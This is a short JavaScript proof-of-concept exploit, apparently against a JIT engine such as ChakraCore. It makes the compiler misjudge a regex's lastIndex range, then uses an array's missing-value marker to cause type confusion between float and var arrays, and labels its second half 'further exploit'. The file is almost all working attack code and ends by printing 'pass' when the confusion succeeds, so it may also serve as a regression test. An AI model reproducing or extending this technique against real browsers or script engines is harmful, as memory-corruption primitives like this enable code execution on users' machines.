let reg = / /g;
reg.lastIndex = 1;

function jit(arg) {
    reg.lastIndex = 2;
    if (reg.lastIndex > 1 && reg.lastIndex < 5) {
        let tmp = "wwww".split(arg);
        if (flag) {
            reg.lastIndex = 4;	//prevent constant fold
        }
        return [3, reg.lastIndex - 524286];	// the valueInfo is [2,4], but lastIndex can be zero.
    }
}

let reg2 = / /g;
flag = 1; jit(reg2);
flag = 0;
for (let i = 0; i < 3; i++) {
    jit(reg2);
}

Array.isArray([]);
let evil = jit(reg);



/************** further exploit *****************************/
evil[0] = 1.1;

function jit2(victim, giveMeMissingValue, changeMe) {
    [].slice();  //just a breakpoint
    let MissingValue = giveMeMissingValue[1];
    victim[0] = 1.1;
    changeMe[0x100] = MissingValue;   //change float Array to var Array
    victim[0] = 6.17651672645e-312;   //type confusion happen here
}

for (let i = 0; i < 3; i++) {
    let farr = [2, 3, 4, 5, 6.6, 7, 8, 9];
    delete farr[1];
    jit2(farr, [1.1, 2.2], farr);
}

let victim = [1.1, 2.2];

jit2(victim, evil, victim);

if (victim[0] === 6.17651672645e-312) {
    WScript.Echo('pass');
}
